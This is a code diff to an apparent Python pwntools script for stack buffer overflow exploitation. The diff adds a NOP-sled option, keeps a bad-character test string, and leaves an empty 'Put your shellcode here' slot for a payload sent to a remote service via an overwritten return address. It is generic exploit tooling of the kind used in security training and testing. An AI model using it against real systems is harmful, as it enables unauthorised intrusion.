@@ -1,8 +1,7 @@
 import argparse
 from pprint import pprint
 
-from pwn import flat, remote, shellcraft, asm
-from pwnlib.encoders import encoder
+from pwn import flat, remote
 
 
 def send_payload(
@@ -61,10 +60,13 @@ if __name__ == "__main__":
     parser.add_argument(
         "-ra", "--return-address", type=str, required=True, help="JMP ESP"
     )
+    parser.add_argument(
+        "-ns", "--nop-shed", type=int, required=False, help="Number of nop padding after ESP"
+    )
 
     parser.add_argument(
         "-s",
-        "--payload_size",
+        "--payload-size",
         type=int,
         required=False,
         help="Size of the payload that will be sent.",
@@ -90,12 +92,17 @@ if __name__ == "__main__":
     prepend_cmd = args.prepend_cmd
     offset_before_instruction_pointer = args.offset_eip
     return_address = int(args.return_address, 16)
+    nop_shed_padding = args.nop_shed
 
     send_bad_chars = args.send_bad_chars
     except_bad_chars = args.except_bad_chars
 
+    shellcode = b""
+    if nop_shed_padding:
+        shellcode += (b"\x90" * nop_shed_padding)
+
     if send_bad_chars:
-        shellcode = (
+        shellcode += (
           b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
           b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
           b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
@@ -124,10 +131,7 @@ if __name__ == "__main__":
         print("badchars: " + ''.join(['\\x%02x' % b for b in shellcode]))
 
     else:
-        # Play nopshed size
-        nopshed_size = 16
-        shellcode = b"\x90" * nopshed_size
-
+        # Put your shellcode here
         # Try different payload encoding, or try double encoding
         shellcode += b""
 
